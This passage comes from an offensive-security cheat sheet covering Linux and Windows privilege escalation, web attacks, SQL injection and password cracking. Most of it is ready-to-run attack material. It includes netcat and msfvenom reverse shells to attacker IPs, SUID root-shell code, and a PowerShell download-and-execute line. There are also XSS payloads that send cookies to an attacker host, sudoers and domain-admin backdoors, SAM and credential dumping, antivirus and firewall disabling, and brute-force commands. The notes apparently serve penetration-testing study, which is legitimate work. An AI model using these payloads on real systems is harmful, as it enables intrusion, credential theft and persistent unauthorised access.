find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

What folders are world writeable?:
```bash
# world-writeable folders
find / -writable -type d 2>/dev/null

# world-writeable folders
find / -perm -222 -type d 2>/dev/null

# world-writeable folders
find / -perm -o w -type d 2>/dev/null

# world-executable folders
find / -perm -o x -type d 2>/dev/null

# world-writeable & executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

There are a few scripts that can automate the linux enumeration process:
Google Linux Kernel exploitation

LinuxPrivChecker.py
https://www.securitysift.com/download/linuxprivchecker.py

LinEnum - (Recently Updated)
https://github.com/rebootuser/LinEnum

linux-exploit-suggester (Recently Updated)
https://github.com/mzet-/linux-exploit-suggester

Highon.coffee Linux Local Enum - Great enumeration script!
wget https://highon.coffee/downloads/linux-local-enum.sh

Linux Privilege Exploit Suggester (Old has not been updated in years)
https://github.com/PenturaLabs/Linux_Exploit_Suggester

Linux post exploitation enumeration and exploit checking tools
https://github.com/reider-roque/linpostexp

Handy Kernel Exploits
CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)
https://www.exploit-db.com/exploits/14814/
```bash
wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
$ gcc i-can-haz-modharden.c -o i-can-haz-modharden
$ ./i-can-haz-modharden
[+] launching root shell!
# id
uid=0(root) gid=0(root)
```

CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
https://www.exploit-db.com/exploits/15285/

CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
https://git.zx2c4.com/CVE-2012-0056/about/
Linux CVE 2012-0056

```bash
wget -O exploit.c http://www.exploit-db.com/download/18411
gcc -o mempodipper exploit.c  
./mempodipper
```

CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
https://dirtycow.ninja/
First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016

Run a command as a user other than root
```bash
sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf
```

Add a user or change a password
```bash
/usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor
echo thePassword | passwd haxzor --stdin
```

Local Privilege Escalation Exploit in Linux
SUID (Set owner User ID up on execution)
Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.
below are some quick copy and paste examples for various shells:

SUID C Shell for /bin/bash
```c
int main(void){
setresuid(0, 0, 0);
system("/bin/bash");
}
```

SUID C Shell for /bin/sh
```c
int main(void){
setresuid(0, 0, 0);
system("/bin/sh");
}
```

Building the SUID Shell binary
```bash
gcc -o suid suid.c
# For 32 bit:
gcc -m32 -o suid suid.c
```

Create and compile an SUID from a limited shell (no file transfer)
```bash
echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" > privsc.c
gcc privsc.c -o privsc
chmod +x privsc
./privsc
```

Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data  ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440  /etc/sudoers' > /tmp/update
```

You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your  command instead. In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.
```bash
set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
chmod +x ssh
```

SearchSploit
```bash
searchsploit -uncsearchsploit apache 2.2
searchsploit "Linux Kernel"
searchsploit linux 2.6 | grep -i ubuntu | grep local
searchsploit slmail
```

Kernel Exploit Suggestions for Kernel Version 3.0.0
```bash
/usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0
```

Precompiled Linux Kernel Exploits - Super handy if GCC is not installed on the target machine!
https://www.kernel-exploits.com/

Collect root password
cat /etc/shadow |grep root

Find and display the proof.txt or flag.txt - LOOT!
```bash
cat $(find / -name proof.txt -print)
```

NFS; no_root_squash,insecure,rw
```bash
# If /etc/exports has a line like:

/srv/share 192.168.42.0/24(insecure,rw)
/srv/share 127.0.0.1/32(no_root_squash,insecure,rw)

# NFS is being exported and you and you have ssh access to the machine. From your attacker machine while logged as root user run:

ssh -f -N user@192.168.42.42 -L 2049:127.0.0.1:2049
mount -t nfs 127.0.0.1:/srv/share my_share
cd my_share
cat > shell.c<<EOF
#include <unistd.h>
int main(){
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
EOF
gcc shell.c -o shell
sudo chown root:root shell
sudo chmod u+s shell

# Now from inside a SSH session on the victim machine (in this example 192.168.42.32):

bash-4.2$ cd /srv/pelota
bash-4.2$ ./shell
```

### Windows Privilege Escalation

Windows Privilege Escalation resource
http://www.fuzzysecurity.com/tutorials/16.html

Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group:
```bash
whoami
net user "%username%"
```

Try the getsystem command using meterpreter - rarely works but is worth a try.
meterpreter > getsystem

No File Upload Required Windows Privlege Escalation Basic Information  Gathering (based on the fuzzy security tutorial and windows_privesc_check.py).

Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report:
```Batchfile
@echo --------- BASIC WINDOWS RECON ---------  > report.txt
timeout 1
net config Workstation  >> report.txt
timeout 1
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
timeout 1
hostname >> report.txt
timeout 1
net users >> report.txt
timeout 1
ipconfig /all >> report.txt
timeout 1
route print >> report.txt
timeout 1
arp -A >> report.txt
timeout 1
netstat -ano >> report.txt
timeout 1
netsh firewall show state >> report.txt  
timeout 1
netsh firewall show config >> report.txt
timeout 1
schtasks /query /fo LIST /v >> report.txt
timeout 1
tasklist /SVC >> report.txt
timeout 1
net start >> report.txt
timeout 1
DRIVERQUERY >> report.txt
timeout 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
timeout 1
findstr /si password *.xml *.ini *.txt >> report.txt
timeout 1
reg query HKLM /f password /t REG_SZ /s >> report.txt
timeout 1
reg query HKCU /f password /t REG_SZ /s >> report.txt 
timeout 1
dir "C:\"
timeout 1
dir "C:\Program Files\" >> report.txt
timeout 1
dir "C:\Program Files (x86)\"
timeout 1
dir "C:\Users\"
timeout 1
dir "C:\Users\Public\"
timeout 1
echo REPORT COMPLETE!
```

Windows Server 2003 and IIS 6.0 WEBDAV Exploiting
http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt
cadavar http://$ip
dav:/> put aspshell.txt
Uploading aspshell.txt to `/aspshell.txt':
Progress: [=============================>] 100.0% of 38468 bytes succeeded.
dav:/> copy aspshell.txt aspshell3.asp;.txt
Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
dav:/> exit
```

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 1.2.3.4
msf exploit(handler) > set LPORT 80
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j
```

```bash
curl http://$ip/aspshell3.asp;.txt
```

```
[*] Started reverse TCP handler on 1.2.3.4:443 
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 1.2.3.5
[*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700
```

Windows privledge escalation exploits are often written in Python.  So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.

```bash
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py
```

Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:
https://www.exploit-db.com/exploits/6705/
https://github.com/Re4son/Churrasco

```
c:\Inetpub>churrasco
churrasco
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"

c:\Inetpub>churrasco -d "net user /add <username> <password>"
c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
c:\Inetpub>churrasco -d "net localgroup "Remote Desktop Users" <username> /add"
```

Windows MS11-080 - http://www.exploit-db.com/exploits/18176/
```bash
python pyinstaller.py --onefile ms11-080.py
ms11-080.exe -O XP
```

Powershell Exploits - You may find that some Windows priviledge escalation exploits are written in Powershell. You may not have an  interactive shell that allows you to enter the powershell prompt. Once the powershell script is uploaded to the server, here is a quick one  liner to run a powershell command from a basic (cmd.exe) shell:

MS16-032 https://www.exploit-db.com/exploits/39719/
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"

Powershell Priv Escalation Tools
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

Windows Run As - Switching users in linux is trival with the `su` command.  However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows.

Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).
```
C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
C:\>PsExec64.exe \\remote_hostname -u <username> -p <password> shell64.exe
```

Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know their password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:

```
C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
Enter the password for Test:
Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
```

PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.

From Powershell prompt
```
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $username = "<domain>\<user>"
PS C:\> $password = '<password>'
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<ip/host>:<port>/path/to/file.evil') } -Credential $cred -Computer localhost
-----------------------------------------------------------------------------------------------------
Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
```

From command prompt
```
$username = '<username here>'
$password = '<password here>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
```

Next run this script using powershell.exe:
```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
```

Group Policy Preferences (GPP)
A common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files
map the Domain controller SYSVOL share

```
net use z:\\dc01\SYSVOL
```

Find the GPP file: Groups.xml
```
dir /s Groups.xml
```

Review the contents for passwords
```
type Groups.xml
```

Decrypt using GPP Decrypt
```
gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
```

Windows dump passwords
```
# dump SAM
reg save HKLM\sam sam
reg save HKLM\system system

# vnc passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"

# windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

Crack SAM + SYSTEM + Security
```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL
john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

powershell disable av
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Windows configuration issues

#### Weak Service permissions

Find weak service permissions
```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> services.txt
for /f eol^=^"^ delims^=^" %a in (services.txt) do cmd.exe /c icacls "%a" >> permissions.txt

copy useradd.exe C:\the\path\to\service\binary.exe
```

#### Insecure Service Permissions with accesschk.exe and sc
```
accesschk.exe -accepteula
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
# find a service that returns `SERVICE_ALL_ACCESS`.
sc qc Apache # query the service to check whether it runs as system, it's binary path, etc.
sc config Apache binPath= "C:\Windows\TEMP\nc.exe 192.168.1.23 4444 -e cmd.exe" # or "net localgroup administrators bob /add"
sc config Apache obj= ".\LocalSystem" password= "" # this makes the service run as SYSTEM. do this for services that has smth other than LocalSystem in SERVICE_START_NAME
sc config Apache start= demand # this allows a service to be started. do this if a service is disabled
# restart service
```

#### Unquoted Services

Find unquoted services
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

Windows will look for the following paths in order
```
# C:\Program Files (x86)\Program Folder\A Subfolder\Another Subfolder\Executable.exe
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Program.exe
C:\Program Files (x86)\Program Folder\A.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Another.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Another Subfolder\Executable.exe
```

```
icacls "C:\Program Files (x86)\Program Folder\A Subfolder"
# look for `Everyone:(...)(F)`, `BUILTIN\Users:(...)(F)`, `NT AUTHORITY\Authenticated Users:(...)(M)`, `NT AUTHORITY\Authenticated Users:(...)(C)`, or `[Computer]\[Your User]:(...)(F)` to check if you are able to write that directory
# drop a malicious executable at "C:\Program Files (x86)\Program Folder\A Subfolder\Another.exe" that spawns a shell
# restart service
```

#### AlwaysInstallElevated
```
# On Windows:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# if key is found, the following is produced:
# HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
#    AlwaysInstallElevated    REG_DWORD    0x1
# if not found:
# ERROR: The system was unable to find the specified registry key or value.

# On Kali, generate a msi that will call a reverse shell
msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=[kali ip] LPORT=[port] -f exe -o payload.exe
msfvenom -p windows/exec cmd="C:\Users\bob\AppData\Local\Temp\Payload.exe" -f msi-nouac -o shell.msi
# transfer both to "C:\Users\bob\AppData\Local\Temp\"

# On Windows:
msiexec /quiet /qn /i "C:\Users\bob\AppData\Local\Temp\malicious.msi" # /quiet - Suppress messages to the user, /qn - no gui, /i - regular (vs administrative) installation
```

#### DLL Hijacking

Order in which Windows finds a DLL:

- The directory from which the application loaded
- 32-bit System directory (C:\Windows\System32)
- Windows directory (C:\Windows)
- The current working directory (CWD)
- Directories in the PATH environment variable (system then user) <- target

If we have write access to any of the directories in the Windows PATH we win.

We'll need 2 things, a writable file/folder in %PATH% ("C:\Python27"), and a vulnerable service/application that has missing DLLs (IKEEXT):

```
echo %path%
# Find a non-default directory in "C:\", it will give write access to authenticated users.
icacls "C:\Python27"
msfvenom -p windows/shell_reverse_tcp lhost=[kali ip] lport=[port] -f dll -o shell.dll # on Kali
copy shell.dll C:\Python27\wlbsctrl.dll
# restart IKEEXT service
```

searchsploit [program] dll. Find ones that has "DLL Hijacking" in the name

#### Task Scheduler Weak File/Folder Permissions

```
schtasks /query /fo LIST /v
# Look at the "Task To Run" within the task list. Eg: E:\GrabLogs\tftp.exe 10.1.1.99 GET ...
icacls "E:\GrabLogs"
# If Authenticated Users or Users or equivalent has modify permissions, simply replace the binary within with a reverse shell
copy shell.exe E:\GrabLogs\tftp.exe
```

#### Stored Credentials

```
dir c:\*pass*.txt /s /b
dir c:\*vnc.ini /s /b /c
dir c:\*ultravnc.ini /s /b /c
dir c:\ /s /b /c | findstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
type C:\unattend.xml
type C:\sysprep.inf
type C:\sysprep\sysprep.xml
```

Retrieving credentials stored within GPP files from Domain Controller:
```
net use z: \\dc01\SYSVOL # whr dc01 is the Domain Controller
cd C:\Windows\SYSVOL # or cd in, if you are the Domain Controller already
dir /s Groups.xml
findstr -si cpassword C:\..\Groups.xml
# within Groups.xml file, find "cpassword", then gpp-decrypt them on kali
```

### Useful Cmd commands

Restarting a Windows service methods:
```
sc query Apache # check service status

sc stop Apache && sc start Apache
net stop Apache && net start Apache
wmic service Apache call startservice
shutdown /r /t 0 # last resort, reboot, or just wait for user to reboot
```

Preparation of adding a non-privileged user and allowing remote desktop connection:
```
net user bob bob /add
net localgroup "Remote Desktop Users" bob /add
# runas /user:bob cmd.exe # to use a shell instead of remote connection
```

Adding user to local administrators group:
```
net localgroup administrators bob /add
```

Creating a Domain Admin user and login to other servers within the domain. By default, Domain Admins group is part of every server's local Administrator group within the domain.
```
net user testing Password1 /add /domain
net group "Domain Admins" testing /add /domain
# rdesktop -u '[domain]\testing' -p 'Password1' [ip of server part of domain] # on kali
```

Checking firewall rules:
```
# Deprecated firewall command
netsh firewall set opmode mode=disable exceptions=disable # disable firewall, requires priv

# Newer advfirewall
netsh advfirewall set currentprofile state off # disable firewall, requires priv
netsh advfirewall firewall show rule name=all | find "Rule Name:" | find "NameLookingFor" # search for a rule
```

Finding a file
```
dir /s proof.txt # /s recursive
dir /s /a proof.txt # /s recursive, /a attributes (show all hidden and system files as well)
```

Finding strings
```
findstr /i "hello" filename # /i for ignore case
findstr /si "hello" # /i for ignore case, /s for recursive
```

Opening a file in notepad (requires GUI):
```
start notepad filename
```

Shortnames when changing directories or during directory path traversal:
```
# C:\Program Files\A Pro Gram\
# 6 first chars + ~1
cd C:\PROGRA~1\APROGR~1\
```

Finding Windows version with only hard drive access:
```
type C:\Windows\System32\eula.txt
```


## Client, Web and Password Attacks

Client Attacks
MS12-037- Internet Explorer 8 Fixed Col Span ID
```bash
wget -O exploit.html http://www.exploit-db.com/download/24017
service apache2 start
```

Linux Client Shells
http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/

### Setting up the Client Side Exploit

Injecting a Backdoor Shell into Plink.exe
```bash
backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $ip -P 4444 -s reverse_shell_tcp
```

Web Attacks
Web Shag Web Application Vulnerability Assessment Platform
```bash
webshag-gui
```

Web Shells
http://tools.kali.org/maintaining-access/webshells
```bash
ls -l /usr/share/webshells/
```

Generate a PHP backdoor (generate) protected with the given password (s3cr3t)
```bash
weevely generate s3cr3t
weevely http://$ip/weevely.php s3cr3t
```

### HTTP / HTTPS Webserver Enumeration

nikto -h $ip

Essential Firefox Add-ons
- Cookies Manager https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/
- Tamper Data https://addons.mozilla.org/en-US/firefox/addon/tamper-data/

Cross Site Scripting (XSS)
significant impacts, such as cookie stealing and authentication bypass, redirecting the victim’s browser to a malicious HTML page, and more

Browser Redirection and IFRAME Injection
```html
<iframe SRC="http://$ip/report" height="0" width="0"></iframe>
```

Stealing Cookies and Session Information

Get request
```javascript
<script>new image().src="http://$ip/bogus.php?output="+document.cookie;</script>
```

Post request
```
var http = new XMLHttpRequest();var url = "/flatfilelogin/shout.php";var params = "input_name=stolen&input_text=" + document.cookie;http.open("POST", url, true);http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");http.send(params);
```

Xss enumerate payloads
```
'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appName;</script>
'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appVersion;</script>
'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.platform;</script>
```

Xss redirect to own server
```
'">><script>document.location="http://attacker-ip:81";</script>
'">><script>window.location="http://attacker-ip:81";</script>
```


### WebDAV Enumeration

The IIS server is not exploitable if the root folder is protected.

#### Detecting WebDAV

PROPFIND request
```
PROPFIND / HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/xml
Content-Length: 298

<?xml version="1.0" encoding="utf-8"?>
<propfind xmlns="DAV:">
<prop>
<getcontentlength xmlns="DAV:"/>
<getlastmodified xmlns="DAV:"/>
<executable xmlns="http://apache.org/dav/props/"/>
<resourcetype xmlns="DAV:"/>
<checked-in xmlns="DAV:"/>
<checked-out xmlns="DAV:"/>
</prop>
</propfind>
```

When WebDAV is enabled, it should return "HTTP/1.1 207 Multi-Status".
When WebDAV has been disabled, it should return "HTTP/1.1 501 Not Supported".

Nmap script
```bash
nmap -T4 -p80 --script=http-iis-webdav-vuln xxx.xxx.xxx.xxx
```

#### Exploiting WebDAV

PUT => COPY (semicolon vulnerability)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt
cadavar http://$ip
dav:/> put aspshell.txt
Uploading aspshell.txt to `/aspshell.txt':
Progress: [=============================>] 100.0% of 38468 bytes succeeded.
dav:/> copy aspshell.txt aspshell3.asp;.txt
Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
dav:/> exit
```

### SQLMap Examples

Crawl the links
```bash
sqlmap -u http://$ip --crawl=1
sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
```

SQLMap Search for databases against a suspected GET SQL Injection
```bash
sqlmap -u http://$ip/blog/index.php?search -dbs
```

SQLMap dump tables from database oscommerce at GET SQL injection
```bash
sqlmap -u http://$ip/blog/index.php?search= -dbs -D oscommerce -tables -dumps
```

SQLMap GET Parameter command
```bash
sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5
```

SQLMap Post Username parameter
```bash
sqlmap -u http://$ip/login.php --method=POST  --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --dump-all
```

SQL Map OS Shell
```bash
sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell
sqlmap -u http://$ip/login.php --method=POST  --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --os-shell
```

Automated sqlmap scan
```bash
sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"
```

Targeted sqlmap scan
```bash
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
```

Scan url for union + error based injection with mysql backend and use a random user agent + database dump
```bash
sqlmap -o -u http://$ip/index.php --forms --dbs
sqlmap -o -u "http://$ip/form/" --forms
```

Sqlmap check form for injection
```bash
sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump
```

Enumerate databases
```bash
sqlmap --dbms=mysql -u "$URL" --dbs
```

Enumerate tables from a specific database
```bash
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables
```

Dump table data from a specific database and table
```bash
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump
```

Specify parameter to exploit
```bash
sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2
```

Specify parameter to exploit in 'nice' URIs (exploits param1)
```bash
sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs
```

Get OS shell
```bash
sqlmap --dbms=mysql -u "$URL" --os-shell
```

Get SQL shell
```bash
sqlmap --dbms=mysql -u "$URL" --sql-shell
```

SQL query
```bash
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
```

Use Tor Socks5 proxy
```bash
sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs
```

### Password Attacks
AES Decryption
http://aesencryption.net/

Convert multiple webpages into a word list
for x in 'index' 'about' 'post' 'contact' ; do curl http://$ip/$x.html|html2markdown | tr -s ' ' '\\n' >> webapp.txt;done

Or convert html to word list dict
```bash
html2dic index.html.out | sort -u > index-html.dict
```

Default Usernames and Passwords
CIRT
http://www.cirt.net/passwords

Government Security - Default Logins and Passwords for Networked Devices
http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php

Virus.org
http://www.virus.org/default-password/

Default Password
http://www.defaultpassword.com/

Brute Force
Nmap Brute forcing Scripts
https://nmap.org/nsedoc/categories/brute.html


### Dictionary Files
Word lists on Kali
```
/usr/share/wordlists
```

Key-space Brute Force

```bash
crunch 6 6 0123456789ABCDEF -o crunch1.txt
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha
crunch 8 8 -t ,@@^^%%%
```


### Pwdump and Fgdump - Security Accounts Manager (SAM)

pwdump.exe - attempts to extract password hashes
fgdump.exe - attempts to kill local antiviruses before attempting to dump the password hashes and cached credentials.

### Windows Credential Editor (WCE)
allows one to perform several attacks to obtain clear text passwords and hashes. Usage: wce -w

### Mimikatz
extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets

https://github.com/gentilkiwi/mimikatz
```
privilege::debug
samdump::hashes
sekurlsa::searchPasswords
sekurlsa::logonPasswords
```

### Password Profiling
cewl can generate a password list from a web page
```bash
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
```

### Password Mutating
John the ripper can mutate password lists
nano /etc/john/john.conf
```bash
john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
```


### Key space bruteforce

```
crunch 6 6 0123456789ABCDEF -o crunch1.txt # length 6 0-9A-F
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt # length 4 a-zA-Z
crunch 0 0 -p test ing 123 # crunch will find all combinations of those 3 words, eg. 123ingtest
```

We can generate a customized password list:
```
# @ - Lower case alpha characters
# , - Upper case alpha characters
# % - Numeric characters
# ^ - Special characters including space

crunch 8 8 -t ,@@^^%%% # this will generate 160GB of data
```

### Ncrack
ncrack (from the makers of nmap) can brute force RDP
ncrack -vv --user offsec -P password-file.txt rdp://$ip

### Hydra
Hydra brute force against SNMP
```bash
hydra -P password-file.txt -v $ip snmp

# Hydra FTP known user and rockyou password list
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp

# Hydra SSH using list of users and passwords
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh

# Hydra SSH using a known password and a username list
hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh

# Hydra SSH Against Known username on port 22
hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt

# Hydra POP3 Brute Force
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V

# Hydra SMTP Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V

# Hydra attack http get 401 login with a dictionary
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin

# Hydra attack Windows Remote Desktop with rockyou
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip

# Hydra brute force SMB user with rockyou:
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb

# Hydra brute force a Wordpress admin login
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post  '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

### papator (ssh bruteforce)
```bash
patator ssh_login host=target-ip port=22 user=username password=FILE0 0=/opt/SecLists/Passwords/probable-v2-top1575.txt
# Optional: -x ignore:fgrep='failed.'
```

### Password Hash Attacks
Online Password Cracking
https://crackstation.net/
http://finder.insidepro.com/

Cracking Linux Hashes - /etc/shadow file
```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Cracking Windows Hashes
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

Cracking Common Application Hashes
```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:
```bash
hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt
```

Sample Hashes
http://openwall.info/wiki/john/sample-hashes

Identify Hashes
hash-identifier

To crack linux hashes you must first unshadow them:
```bash
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
```

John the Ripper - Password Hash Cracking

```bash
john $ip.pwdump
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

JTR forced descrypt cracking with wordlist
```bash
john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
